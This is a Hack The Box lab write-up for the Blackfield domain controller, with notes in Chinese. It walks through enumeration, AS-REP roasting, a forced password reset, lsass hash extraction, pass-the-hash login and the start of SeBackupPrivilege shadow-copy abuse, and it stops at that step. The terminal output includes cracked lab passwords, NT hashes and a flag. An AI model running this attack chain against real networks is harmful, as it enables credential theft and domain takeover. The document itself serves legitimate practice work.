###### tags: `Hack the box` `HTB` `Hard` `Windows`

# Blackfield
```
┌──(kali㉿kali)-[~/htb]
└─$ rustscan -a 10.129.229.17 -u 5000 -t 8000 --scripts -- -n -Pn -sVC

Open 10.129.229.17:53
Open 10.129.229.17:88
Open 10.129.229.17:135
Open 10.129.229.17:389
Open 10.129.229.17:445
Open 10.129.229.17:593
Open 10.129.229.17:3268
Open 10.129.229.17:5985


PORT     STATE SERVICE       REASON  VERSION
53/tcp   open  domain        syn-ack Simple DNS Plus
88/tcp   open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: 2024-06-05 09:03:12Z)
135/tcp  open  msrpc         syn-ack Microsoft Windows RPC
389/tcp  open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds? syn-ack
593/tcp  open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
3268/tcp open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
5985/tcp open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
```

smb試試看
```
┌──(kali㉿kali)-[~/htb]
└─$ smbclient -N -L 10.129.229.17

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        forensic        Disk      Forensic / Audit share.
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        profiles$       Disk      
        SYSVOL          Disk      Logon server share
```

進`profiles$`把他們做成user.txt
```
┌──(kali㉿kali)-[~/htb]
└─$ smbclient -N //10.129.229.17/profiles$

smb: \> dir
  .                                   D        0  Wed Jun  3 12:47:12 2020
  ..                                  D        0  Wed Jun  3 12:47:12 2020
  AAlleni                             D        0  Wed Jun  3 12:47:11 2020
  ABarteski                           D        0  Wed Jun  3 12:47:11 2020
  ABekesz                             D        0  Wed Jun  3 12:47:11 2020
  ABenzies                            D        0  Wed Jun  3 12:47:11 2020
  ABiemiller                          D        0  Wed Jun  3 12:47:11 2020
  AChampken                           D        0  Wed Jun  3 12:47:11 2020
  ACheretei                           D        0  Wed Jun  3 12:47:11 2020
  ACsonaki                            D        0  Wed Jun  3 12:47:11 2020
  AHigchens                           D        0  Wed Jun  3 12:47:11 2020
  AJaquemai                           D        0  Wed Jun  3 12:47:11 2020
  AKlado                              D        0  Wed Jun  3 12:47:11 2020
  AKoffenburger                       D        0  Wed Jun  3 12:47:11 2020
  AKollolli                           D        0  Wed Jun  3 12:47:11 2020
  AKruppe                             D        0  Wed Jun  3 12:47:11 2020
  AKubale                             D        0  Wed Jun  3 12:47:11 2020
  ALamerz                             D        0  Wed Jun  3 12:47:11 2020
  AMaceldon                           D        0  Wed Jun  3 12:47:11 2020
  AMasalunga                          D        0  Wed Jun  3 12:47:11 2020
  ANavay                              D        0  Wed Jun  3 12:47:11 2020
  ANesterova                          D        0  Wed Jun  3 12:47:11 2020
  ANeusse                             D        0  Wed Jun  3 12:47:11 2020
  AOkleshen                           D        0  Wed Jun  3 12:47:11 2020
  APustulka                           D        0  Wed Jun  3 12:47:11 2020
  ARotella                            D        0  Wed Jun  3 12:47:11 2020
  ASanwardeker                        D        0  Wed Jun  3 12:47:11 2020
  AShadaia                            D        0  Wed Jun  3 12:47:11 2020
  ASischo                             D        0  Wed Jun  3 12:47:11 2020
  ASpruce                             D        0  Wed Jun  3 12:47:11 2020
  ATakach                             D        0  Wed Jun  3 12:47:11 2020
  ATaueg                              D        0  Wed Jun  3 12:47:11 2020
  ATwardowski                         D        0  Wed Jun  3 12:47:11 2020
  audit2020                           D        0  Wed Jun  3 12:47:11 2020
  AWangenheim                         D        0  Wed Jun  3 12:47:11 2020
  AWorsey                             D        0  Wed Jun  3 12:47:11 2020
  AZigmunt                            D        0  Wed Jun  3 12:47:11 2020
  BBakajza                            D        0  Wed Jun  3 12:47:11 2020
  BBeloucif                           D        0  Wed Jun  3 12:47:11 2020
  BCarmitcheal                        D        0  Wed Jun  3 12:47:11 2020
  BConsultant                         D        0  Wed Jun  3 12:47:11 2020
  BErdossy                            D        0  Wed Jun  3 12:47:11 2020
  BGeminski                           D        0  Wed Jun  3 12:47:11 2020
  BLostal                             D        0  Wed Jun  3 12:47:11 2020
  BMannise                            D        0  Wed Jun  3 12:47:11 2020
  BNovrotsky                          D        0  Wed Jun  3 12:47:11 2020
  BRigiero                            D        0  Wed Jun  3 12:47:11 2020
  BSamkoses                           D        0  Wed Jun  3 12:47:11 2020
  BZandonella                         D        0  Wed Jun  3 12:47:11 2020
  CAcherman                           D        0  Wed Jun  3 12:47:12 2020
  CAkbari                             D        0  Wed Jun  3 12:47:12 2020
  CAldhowaihi                         D        0  Wed Jun  3 12:47:12 2020
  CArgyropolous                       D        0  Wed Jun  3 12:47:12 2020
  CDufrasne                           D        0  Wed Jun  3 12:47:12 2020
  CGronk                              D        0  Wed Jun  3 12:47:11 2020
  Chiucarello                         D        0  Wed Jun  3 12:47:11 2020
  Chiuccariello                       D        0  Wed Jun  3 12:47:12 2020
  CHoytal                             D        0  Wed Jun  3 12:47:12 2020
  CKijauskas                          D        0  Wed Jun  3 12:47:12 2020
  CKolbo                              D        0  Wed Jun  3 12:47:12 2020
  CMakutenas                          D        0  Wed Jun  3 12:47:12 2020
  CMorcillo                           D        0  Wed Jun  3 12:47:11 2020
  CSchandall                          D        0  Wed Jun  3 12:47:12 2020
  CSelters                            D        0  Wed Jun  3 12:47:12 2020
  CTolmie                             D        0  Wed Jun  3 12:47:12 2020
  DCecere                             D        0  Wed Jun  3 12:47:12 2020
  DChintalapalli                      D        0  Wed Jun  3 12:47:12 2020
  DCwilich                            D        0  Wed Jun  3 12:47:12 2020
  DGarbatiuc                          D        0  Wed Jun  3 12:47:12 2020
  DKemesies                           D        0  Wed Jun  3 12:47:12 2020
  DMatuka                             D        0  Wed Jun  3 12:47:12 2020
  DMedeme                             D        0  Wed Jun  3 12:47:12 2020
  DMeherek                            D        0  Wed Jun  3 12:47:12 2020
  DMetych                             D        0  Wed Jun  3 12:47:12 2020
  DPaskalev                           D        0  Wed Jun  3 12:47:12 2020
  DPriporov                           D        0  Wed Jun  3 12:47:12 2020
  DRusanovskaya                       D        0  Wed Jun  3 12:47:12 2020
  DVellela                            D        0  Wed Jun  3 12:47:12 2020
  DVogleson                           D        0  Wed Jun  3 12:47:12 2020
  DZwinak                             D        0  Wed Jun  3 12:47:12 2020
  EBoley                              D        0  Wed Jun  3 12:47:12 2020
  EEulau                              D        0  Wed Jun  3 12:47:12 2020
  EFeatherling                        D        0  Wed Jun  3 12:47:12 2020
  EFrixione                           D        0  Wed Jun  3 12:47:12 2020
  EJenorik                            D        0  Wed Jun  3 12:47:12 2020
  EKmilanovic                         D        0  Wed Jun  3 12:47:12 2020
  ElKatkowsky                         D        0  Wed Jun  3 12:47:12 2020
  EmaCaratenuto                       D        0  Wed Jun  3 12:47:12 2020
  EPalislamovic                       D        0  Wed Jun  3 12:47:12 2020
  EPryar                              D        0  Wed Jun  3 12:47:12 2020
  ESachhitello                        D        0  Wed Jun  3 12:47:12 2020
  ESariotti                           D        0  Wed Jun  3 12:47:12 2020
  ETurgano                            D        0  Wed Jun  3 12:47:12 2020
  EWojtila                            D        0  Wed Jun  3 12:47:12 2020
  FAlirezai                           D        0  Wed Jun  3 12:47:12 2020
  FBaldwind                           D        0  Wed Jun  3 12:47:12 2020
  FBroj                               D        0  Wed Jun  3 12:47:12 2020
  FDeblaquire                         D        0  Wed Jun  3 12:47:12 2020
  FDegeorgio                          D        0  Wed Jun  3 12:47:12 2020
  FianLaginja                         D        0  Wed Jun  3 12:47:12 2020
  FLasokowski                         D        0  Wed Jun  3 12:47:12 2020
  FPflum                              D        0  Wed Jun  3 12:47:12 2020
  FReffey                             D        0  Wed Jun  3 12:47:12 2020
  GaBelithe                           D        0  Wed Jun  3 12:47:12 2020
  Gareld                              D        0  Wed Jun  3 12:47:12 2020
  GBatowski                           D        0  Wed Jun  3 12:47:12 2020
  GForshalger                         D        0  Wed Jun  3 12:47:12 2020
  GGomane                             D        0  Wed Jun  3 12:47:12 2020
  GHisek                              D        0  Wed Jun  3 12:47:12 2020
  GMaroufkhani                        D        0  Wed Jun  3 12:47:12 2020
  GMerewether                         D        0  Wed Jun  3 12:47:12 2020
  GQuinniey                           D        0  Wed Jun  3 12:47:12 2020
  GRoswurm                            D        0  Wed Jun  3 12:47:12 2020
  GWiegard                            D        0  Wed Jun  3 12:47:12 2020
  HBlaziewske                         D        0  Wed Jun  3 12:47:12 2020
  HColantino                          D        0  Wed Jun  3 12:47:12 2020
  HConforto                           D        0  Wed Jun  3 12:47:12 2020
  HCunnally                           D        0  Wed Jun  3 12:47:12 2020
  HGougen                             D        0  Wed Jun  3 12:47:12 2020
  HKostova                            D        0  Wed Jun  3 12:47:12 2020
  IChristijr                          D        0  Wed Jun  3 12:47:12 2020
  IKoledo                             D        0  Wed Jun  3 12:47:12 2020
  IKotecky                            D        0  Wed Jun  3 12:47:12 2020
  ISantosi                            D        0  Wed Jun  3 12:47:12 2020
  JAngvall                            D        0  Wed Jun  3 12:47:12 2020
  JBehmoiras                          D        0  Wed Jun  3 12:47:12 2020
  JDanten                             D        0  Wed Jun  3 12:47:12 2020
  JDjouka                             D        0  Wed Jun  3 12:47:12 2020
  JKondziola                          D        0  Wed Jun  3 12:47:12 2020
  JLeytushsenior                      D        0  Wed Jun  3 12:47:12 2020
  JLuthner                            D        0  Wed Jun  3 12:47:12 2020
  JMoorehendrickson                   D        0  Wed Jun  3 12:47:12 2020
  JPistachio                          D        0  Wed Jun  3 12:47:12 2020
  JScima                              D        0  Wed Jun  3 12:47:12 2020
  JSebaali                            D        0  Wed Jun  3 12:47:12 2020
  JShoenherr                          D        0  Wed Jun  3 12:47:12 2020
  JShuselvt                           D        0  Wed Jun  3 12:47:12 2020
  KAmavisca                           D        0  Wed Jun  3 12:47:12 2020
  KAtolikian                          D        0  Wed Jun  3 12:47:12 2020
  KBrokinn                            D        0  Wed Jun  3 12:47:12 2020
  KCockeril                           D        0  Wed Jun  3 12:47:12 2020
  KColtart                            D        0  Wed Jun  3 12:47:12 2020
  KCyster                             D        0  Wed Jun  3 12:47:12 2020
  KDorney                             D        0  Wed Jun  3 12:47:12 2020
  KKoesno                             D        0  Wed Jun  3 12:47:12 2020
  KLangfur                            D        0  Wed Jun  3 12:47:12 2020
  KMahalik                            D        0  Wed Jun  3 12:47:12 2020
  KMasloch                            D        0  Wed Jun  3 12:47:12 2020
  KMibach                             D        0  Wed Jun  3 12:47:12 2020
  KParvankova                         D        0  Wed Jun  3 12:47:12 2020
  KPregnolato                         D        0  Wed Jun  3 12:47:12 2020
  KRasmor                             D        0  Wed Jun  3 12:47:12 2020
  KShievitz                           D        0  Wed Jun  3 12:47:12 2020
  KSojdelius                          D        0  Wed Jun  3 12:47:12 2020
  KTambourgi                          D        0  Wed Jun  3 12:47:12 2020
  KVlahopoulos                        D        0  Wed Jun  3 12:47:12 2020
  KZyballa                            D        0  Wed Jun  3 12:47:12 2020
  LBajewsky                           D        0  Wed Jun  3 12:47:12 2020
  LBaligand                           D        0  Wed Jun  3 12:47:12 2020
  LBarhamand                          D        0  Wed Jun  3 12:47:12 2020
  LBirer                              D        0  Wed Jun  3 12:47:12 2020
  LBobelis                            D        0  Wed Jun  3 12:47:12 2020
  LChippel                            D        0  Wed Jun  3 12:47:12 2020
  LChoffin                            D        0  Wed Jun  3 12:47:12 2020
  LCominelli                          D        0  Wed Jun  3 12:47:12 2020
  LDruge                              D        0  Wed Jun  3 12:47:12 2020
  LEzepek                             D        0  Wed Jun  3 12:47:12 2020
  LHyungkim                           D        0  Wed Jun  3 12:47:12 2020
  LKarabag                            D        0  Wed Jun  3 12:47:12 2020
  LKirousis                           D        0  Wed Jun  3 12:47:12 2020
  LKnade                              D        0  Wed Jun  3 12:47:12 2020
  LKrioua                             D        0  Wed Jun  3 12:47:12 2020
  LLefebvre                           D        0  Wed Jun  3 12:47:12 2020
  LLoeradeavilez                      D        0  Wed Jun  3 12:47:12 2020
  LMichoud                            D        0  Wed Jun  3 12:47:12 2020
  LTindall                            D        0  Wed Jun  3 12:47:12 2020
  LYturbe                             D        0  Wed Jun  3 12:47:12 2020
  MArcynski                           D        0  Wed Jun  3 12:47:12 2020
  MAthilakshmi                        D        0  Wed Jun  3 12:47:12 2020
  MAttravanam                         D        0  Wed Jun  3 12:47:12 2020
  MBrambini                           D        0  Wed Jun  3 12:47:12 2020
  MHatziantoniou                      D        0  Wed Jun  3 12:47:12 2020
  MHoerauf                            D        0  Wed Jun  3 12:47:12 2020
  MKermarrec                          D        0  Wed Jun  3 12:47:12 2020
  MKillberg                           D        0  Wed Jun  3 12:47:12 2020
  MLapesh                             D        0  Wed Jun  3 12:47:12 2020
  MMakhsous                           D        0  Wed Jun  3 12:47:12 2020
  MMerezio                            D        0  Wed Jun  3 12:47:12 2020
  MNaciri                             D        0  Wed Jun  3 12:47:12 2020
  MShanmugarajah                      D        0  Wed Jun  3 12:47:12 2020
  MSichkar                            D        0  Wed Jun  3 12:47:12 2020
  MTemko                              D        0  Wed Jun  3 12:47:12 2020
  MTipirneni                          D        0  Wed Jun  3 12:47:12 2020
  MTonuri                             D        0  Wed Jun  3 12:47:12 2020
  MVanarsdel                          D        0  Wed Jun  3 12:47:12 2020
  NBellibas                           D        0  Wed Jun  3 12:47:12 2020
  NDikoka                             D        0  Wed Jun  3 12:47:12 2020
  NGenevro                            D        0  Wed Jun  3 12:47:12 2020
  NGoddanti                           D        0  Wed Jun  3 12:47:12 2020
  NMrdirk                             D        0  Wed Jun  3 12:47:12 2020
  NPulido                             D        0  Wed Jun  3 12:47:12 2020
  NRonges                             D        0  Wed Jun  3 12:47:12 2020
  NSchepkie                           D        0  Wed Jun  3 12:47:12 2020
  NVanpraet                           D        0  Wed Jun  3 12:47:12 2020
  OBelghazi                           D        0  Wed Jun  3 12:47:12 2020
  OBushey                             D        0  Wed Jun  3 12:47:12 2020
  OHardybala                          D        0  Wed Jun  3 12:47:12 2020
  OLunas                              D        0  Wed Jun  3 12:47:12 2020
  ORbabka                             D        0  Wed Jun  3 12:47:12 2020
  PBourrat                            D        0  Wed Jun  3 12:47:12 2020
  PBozzelle                           D        0  Wed Jun  3 12:47:12 2020
  PBranti                             D        0  Wed Jun  3 12:47:12 2020
  PCapperella                         D        0  Wed Jun  3 12:47:12 2020
  PCurtz                              D        0  Wed Jun  3 12:47:12 2020
  PDoreste                            D        0  Wed Jun  3 12:47:12 2020
  PGegnas                             D        0  Wed Jun  3 12:47:12 2020
  PMasulla                            D        0  Wed Jun  3 12:47:12 2020
  PMendlinger                         D        0  Wed Jun  3 12:47:12 2020
  PParakat                            D        0  Wed Jun  3 12:47:12 2020
  PProvencer                          D        0  Wed Jun  3 12:47:12 2020
  PTesik                              D        0  Wed Jun  3 12:47:12 2020
  PVinkovich                          D        0  Wed Jun  3 12:47:12 2020
  PVirding                            D        0  Wed Jun  3 12:47:12 2020
  PWeinkaus                           D        0  Wed Jun  3 12:47:12 2020
  RBaliukonis                         D        0  Wed Jun  3 12:47:12 2020
  RBochare                            D        0  Wed Jun  3 12:47:12 2020
  RKrnjaic                            D        0  Wed Jun  3 12:47:12 2020
  RNemnich                            D        0  Wed Jun  3 12:47:12 2020
  RPoretsky                           D        0  Wed Jun  3 12:47:12 2020
  RStuehringer                        D        0  Wed Jun  3 12:47:12 2020
  RSzewczuga                          D        0  Wed Jun  3 12:47:12 2020
  RVallandas                          D        0  Wed Jun  3 12:47:12 2020
  RWeatherl                           D        0  Wed Jun  3 12:47:12 2020
  RWissor                             D        0  Wed Jun  3 12:47:12 2020
  SAbdulagatov                        D        0  Wed Jun  3 12:47:12 2020
  SAjowi                              D        0  Wed Jun  3 12:47:12 2020
  SAlguwaihes                         D        0  Wed Jun  3 12:47:12 2020
  SBonaparte                          D        0  Wed Jun  3 12:47:12 2020
  SBouzane                            D        0  Wed Jun  3 12:47:12 2020
  SChatin                             D        0  Wed Jun  3 12:47:12 2020
  SDellabitta                         D        0  Wed Jun  3 12:47:12 2020
  SDhodapkar                          D        0  Wed Jun  3 12:47:12 2020
  SEulert                             D        0  Wed Jun  3 12:47:12 2020
  SFadrigalan                         D        0  Wed Jun  3 12:47:12 2020
  SGolds                              D        0  Wed Jun  3 12:47:12 2020
  SGrifasi                            D        0  Wed Jun  3 12:47:12 2020
  SGtlinas                            D        0  Wed Jun  3 12:47:12 2020
  SHauht                              D        0  Wed Jun  3 12:47:12 2020
  SHederian                           D        0  Wed Jun  3 12:47:12 2020
  SHelregel                           D        0  Wed Jun  3 12:47:12 2020
  SKrulig                             D        0  Wed Jun  3 12:47:12 2020
  SLewrie                             D        0  Wed Jun  3 12:47:12 2020
  SMaskil                             D        0  Wed Jun  3 12:47:12 2020
  Smocker                             D        0  Wed Jun  3 12:47:12 2020
  SMoyta                              D        0  Wed Jun  3 12:47:12 2020
  SRaustiala                          D        0  Wed Jun  3 12:47:12 2020
  SReppond                            D        0  Wed Jun  3 12:47:12 2020
  SSicliano                           D        0  Wed Jun  3 12:47:12 2020
  SSilex                              D        0  Wed Jun  3 12:47:12 2020
  SSolsbak                            D        0  Wed Jun  3 12:47:12 2020
  STousignaut                         D        0  Wed Jun  3 12:47:12 2020
  support                             D        0  Wed Jun  3 12:47:12 2020
  svc_backup                          D        0  Wed Jun  3 12:47:12 2020
  SWhyte                              D        0  Wed Jun  3 12:47:12 2020
  SWynigear                           D        0  Wed Jun  3 12:47:12 2020
  TAwaysheh                           D        0  Wed Jun  3 12:47:12 2020
  TBadenbach                          D        0  Wed Jun  3 12:47:12 2020
  TCaffo                              D        0  Wed Jun  3 12:47:12 2020
  TCassalom                           D        0  Wed Jun  3 12:47:12 2020
  TEiselt                             D        0  Wed Jun  3 12:47:12 2020
  TFerencdo                           D        0  Wed Jun  3 12:47:12 2020
  TGaleazza                           D        0  Wed Jun  3 12:47:12 2020
  TKauten                             D        0  Wed Jun  3 12:47:12 2020
  TKnupke                             D        0  Wed Jun  3 12:47:12 2020
  TLintlop                            D        0  Wed Jun  3 12:47:12 2020
  TMusselli                           D        0  Wed Jun  3 12:47:12 2020
  TOust                               D        0  Wed Jun  3 12:47:12 2020
  TSlupka                             D        0  Wed Jun  3 12:47:12 2020
  TStausland                          D        0  Wed Jun  3 12:47:12 2020
  TZumpella                           D        0  Wed Jun  3 12:47:12 2020
  UCrofskey                           D        0  Wed Jun  3 12:47:12 2020
  UMarylebone                         D        0  Wed Jun  3 12:47:12 2020
  UPyrke                              D        0  Wed Jun  3 12:47:12 2020
  VBublavy                            D        0  Wed Jun  3 12:47:12 2020
  VButziger                           D        0  Wed Jun  3 12:47:12 2020
  VFuscca                             D        0  Wed Jun  3 12:47:12 2020
  VLitschauer                         D        0  Wed Jun  3 12:47:12 2020
  VMamchuk                            D        0  Wed Jun  3 12:47:12 2020
  VMarija                             D        0  Wed Jun  3 12:47:12 2020
  VOlaosun                            D        0  Wed Jun  3 12:47:12 2020
  VPapalouca                          D        0  Wed Jun  3 12:47:12 2020
  WSaldat                             D        0  Wed Jun  3 12:47:12 2020
  WVerzhbytska                        D        0  Wed Jun  3 12:47:12 2020
  WZelazny                            D        0  Wed Jun  3 12:47:12 2020
  XBemelen                            D        0  Wed Jun  3 12:47:12 2020
  XDadant                             D        0  Wed Jun  3 12:47:12 2020
  XDebes                              D        0  Wed Jun  3 12:47:12 2020
  XKonegni                            D        0  Wed Jun  3 12:47:12 2020
  XRykiel                             D        0  Wed Jun  3 12:47:12 2020
  YBleasdale                          D        0  Wed Jun  3 12:47:12 2020
  YHuftalin                           D        0  Wed Jun  3 12:47:12 2020
  YKivlen                             D        0  Wed Jun  3 12:47:12 2020
  YKozlicki                           D        0  Wed Jun  3 12:47:12 2020
  YNyirenda                           D        0  Wed Jun  3 12:47:12 2020
  YPredestin                          D        0  Wed Jun  3 12:47:12 2020
  YSeturino                           D        0  Wed Jun  3 12:47:12 2020
  YSkoropada                          D        0  Wed Jun  3 12:47:12 2020
  YVonebers                           D        0  Wed Jun  3 12:47:12 2020
  YZarpentine                         D        0  Wed Jun  3 12:47:12 2020
  ZAlatti                             D        0  Wed Jun  3 12:47:12 2020
  ZKrenselewski                       D        0  Wed Jun  3 12:47:12 2020
  ZMalaab                             D        0  Wed Jun  3 12:47:12 2020
  ZMiick                              D        0  Wed Jun  3 12:47:12 2020
  ZScozzari                           D        0  Wed Jun  3 12:47:12 2020
  ZTimofeeff                          D        0  Wed Jun  3 12:47:12 2020
  ZWausik                             D        0  Wed Jun  3 12:47:12 2020
```

先用`kerbrute.py`try，發現support可以`NOT PREAUTH`
```
┌──(kali㉿kali)-[~/htb]
└─$ python3 kerbrute.py -users user.txt -domain BLACKFIELD.LOCAL -dc-ip 10.129.229.17
Impacket v0.12.0.dev1+20240523.75507.15eff880 - Copyright 2023 Fortra

[*] Valid user => audit2020
[*] Valid user => support [NOT PREAUTH]
[*] Valid user => svc_backup
[*] No passwords were discovered :'(
```

用他用`ASREP roasting`
```
┌──(kali㉿kali)-[~/htb]
└─$ impacket-GetNPUsers -dc-ip 10.129.229.17 BLACKFIELD.LOCAL/support -no-pass -request
Impacket v0.12.0.dev1+20240523.75507.15eff880 - Copyright 2023 Fortra

[*] Getting TGT for support
$krb5asrep$23$support@BLACKFIELD.LOCAL:fc6419005f3d4a821e85ec8c284cff2b$3dc750d7c55d74ac9563381bb0c13fef9514980556063c4a14b913fc7c865b56d33d56166601b2ec566db13bda081f82acb6f71bc42a518da17d809e982fece644ad6aa5a04651bc82d0158cc3a9597aa2b2cbe80b0febd831b4a4bfc7b7f30be65de00b9b7d21b8204f51b7e17d16e066a5b2c5663ad2c26e0cb4b9f06d93daeb3bac544c409df377b6e8208a2fbaf6b8ee061a0267bf4f489e6e75ae84fb12cab1f92dbaba10f6500eb4159c88f421c390d8ec243ac4842a34a80a943a08bcaf35f40b76a8346fb26db2b26016ebfe7cf492150bd7772fa2f7808424f964c1a7db3dccbe8515bdbd9f5171ad6f5fd314fae883
```

用john破，得密碼`#00^BlackKnight`
```
┌──(kali㉿kali)-[~/htb]
└─$ john support.asreproast --wordlist=/home/kali/rockyou.txt

#00^BlackKnight  ($krb5asrep$23$support@BLACKFIELD.LOCAL) 
```

用`bloodhound-python`
```
┌──(kali㉿kali)-[~/htb]
└─$ bloodhound-python -c All -u 'support' -p '#00^BlackKnight' -d BLACKFIELD.local -ns 10.129.229.17 --zip

INFO: Compressing output into 20240604221834_bloodhound.zip
```

丟`bloodhound`
```
┌──(kali㉿kali)-[~/htb]
└─$ sudo neo4j start 

┌──(kali㉿kali)-[~/htb]
└─$ bloodhound
```

點support`Mark as Owned`，選`Node Info` -> `First Degree Object Control`

![Blackfield_1.png](picture/Blackfield_1.png)

右鍵選`help`，發現support可以用`samba's net tool`改`audit2020`的password
```
┌──(kali㉿kali)-[~/htb]
└─$ net rpc password "audit2020" "newP@ssword2022" -U "BLACKFIELD.local"/"support"%"#00^BlackKnight" -S 10.129.229.17
```

修改後用CME看看
```
┌──(kali㉿kali)-[~/htb]
└─$ crackmapexec smb 10.129.229.17 -u audit2020 -p 'newP@ssword2022'
SMB         10.129.229.17   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.129.229.17   445    DC01             [+] BLACKFIELD.local\audit2020:newP@ssword2022 
```

用`smbclient.py`登入，下載`lsass.zip`
```
┌──(kali㉿kali)-[~/htb]
└─$ smbclient.py audit2020:"newP@ssword2022"@10.129.229.17

# use forensic
# cd memory_analysis
drw-rw-rw-          0  Thu May 28 16:29:24 2020 .
drw-rw-rw-          0  Thu May 28 16:29:24 2020 ..
-rw-rw-rw-   37876530  Thu May 28 16:29:24 2020 conhost.zip
-rw-rw-rw-   24962333  Thu May 28 16:29:24 2020 ctfmon.zip
-rw-rw-rw-   23993305  Thu May 28 16:29:24 2020 dfsrs.zip
-rw-rw-rw-   18366396  Thu May 28 16:29:24 2020 dllhost.zip
-rw-rw-rw-    8810157  Thu May 28 16:29:24 2020 ismserv.zip
-rw-rw-rw-   41936098  Thu May 28 16:29:24 2020 lsass.zip
-rw-rw-rw-   64288607  Thu May 28 16:29:24 2020 mmc.zip
-rw-rw-rw-   13332174  Thu May 28 16:29:24 2020 RuntimeBroker.zip
-rw-rw-rw-  131983313  Thu May 28 16:29:24 2020 ServerManager.zip
-rw-rw-rw-   33141744  Thu May 28 16:29:24 2020 sihost.zip
-rw-rw-rw-   33756344  Thu May 28 16:29:24 2020 smartscreen.zip
-rw-rw-rw-   14408833  Thu May 28 16:29:24 2020 svchost.zip
-rw-rw-rw-   34631412  Thu May 28 16:29:24 2020 taskhostw.zip
-rw-rw-rw-   14255089  Thu May 28 16:29:24 2020 winlogon.zip
-rw-rw-rw-    4067425  Thu May 28 16:29:24 2020 wlms.zip
-rw-rw-rw-   18303252  Thu May 28 16:29:24 2020 WmiPrvSE.zip
# get lsass.zip
```

用[pypykatz](https://github.com/skelsec/pypykatz)dump資訊出來
```
┌──(kali㉿kali)-[~/htb]
└─$ pypykatz lsa minidump lsass.DMP

        == MSV ==
                Username: svc_backup
                Domain: BLACKFIELD
                LM: NA
                NT: 9658d1d1dcd9250115e2205d9f48400d
                SHA1: 463c13a9a31fc3252c68ba0a44f0221626a33e5c
                DPAPI: a03cd8e9d30171f3cfe8caad92fef621
                
        == MSV ==
                Username: DC01$
                Domain: BLACKFIELD
                LM: NA
                NT: b624dc83a27cc29da11d9bf25efea796
                SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
                DPAPI: NA
        == MSV ==
                Username: Administrator
                Domain: BLACKFIELD
                LM: NA
                NT: 7f1e4ff8c6a8e6b6fcae2d9c0572cd62
                SHA1: db5c89a961644f0978b4b69a4d2a2239d7886368
                DPAPI: 240339f898b6ac4ce3f34702e4a89550                
```

加入users.txt跟hash.txt，用cme
```
┌──(kali㉿kali)-[~/htb]
└─$ cat users.txt
svc_backup
DC01$
Administrator
                                                                                                                                            
┌──(kali㉿kali)-[~/htb]
└─$ cat hash.txt 
9658d1d1dcd9250115e2205d9f48400d
b624dc83a27cc29da11d9bf25efea796
7f1e4ff8c6a8e6b6fcae2d9c0572cd62

┌──(kali㉿kali)-[~/htb]
└─$ crackmapexec smb 10.129.229.17 -u users.txt -H hash.txt        
SMB         10.129.229.17   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.129.229.17   445    DC01             [+] BLACKFIELD.local\svc_backup:9658d1d1dcd9250115e2205d9f48400d 
```

用evil-winrm登入`svc_backup`，在`C:\Users\svc_backup\Desktop`得user.txt
```
┌──(kali㉿kali)-[~/htb]
└─$ evil-winrm -i 10.129.229.17 -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d

*Evil-WinRM* PS C:\Users\svc_backup\Desktop> type user.txt
3920bb317a0bef51027e2852be64b543
```

查看`whoami /priv`，發現有`SeBackupPrivilege`跟`SeRestorePrivilege`
```
*Evil-WinRM* PS C:\USers\svc_backup\Desktop> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

參考[Windows Privilege Escalation: SeBackupPrivilege](https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/?source=post_page-----f29a7a6bd355--------------------------------)
```
┌──(kali㉿kali)-[~/htb]
└─$ nano raj.dsh 

set context persistent nowriters
add volume c: alias raj
create
expose %raj% z:

┌──(kali㉿kali)-[~/htb]
└─$ unix2dos raj.dsh
unix2dos: converting file raj.dsh to DOS format...
```

回到靶機上創`Temp`
```
*Evil-WinRM* PS C:\> mkdir Temp

*Evil-WinRM* PS C:\Temp> upload /home/kali/htb/raj.dsh
*Evil-WinRM* PS C:\Temp> diskshadow /s raj.dsh
Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
On computer:  DC01,  6/5/2024 7:03:39 AM

-> set context persistent nowriters
-> add volume c: alias raj
-> create
Alias raj for shadow ID {d1b2e78d-7f57-490b-8263-17b09bec6e61} set as environment variable.
Alias VSS_SHADOW_SET for shadow set ID {42daf24b-443f-4d7d-92bc-464c9a88a4ea} set as environment variable.

Querying all shadow copies with the shadow copy set ID {42daf24b-443f-4d7d-92bc-464c9a88a4ea}

        * Shadow copy ID = {d1b2e78d-7f57-490b-8263-17b09bec6e61}               %raj%
                - Shadow copy set: {42daf24b-443f-4d7d-92bc-464c9a88a4ea}       %VSS_SHADOW_SET%
                - Original count of shadow copies = 1
                - Original volume name: \\?\Volume{6cd5140b-0000-0000-0000-602200000000}\ [C:\]
                - Creation time: 6/5/2024 7:03:40 AM
                - Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
                - Originating machine: DC01.BLACKFIELD.local
                - Service machine: DC01.BLACKFIELD.local
                - Not exposed
                - Provider ID: {b5946137-7b9f-4925-af80-51abd60b20d5}
                - Attributes:  No_Auto_Release Persistent No_Writers Differential

Number of shadow copies listed: 1
-> expose %raj% z:
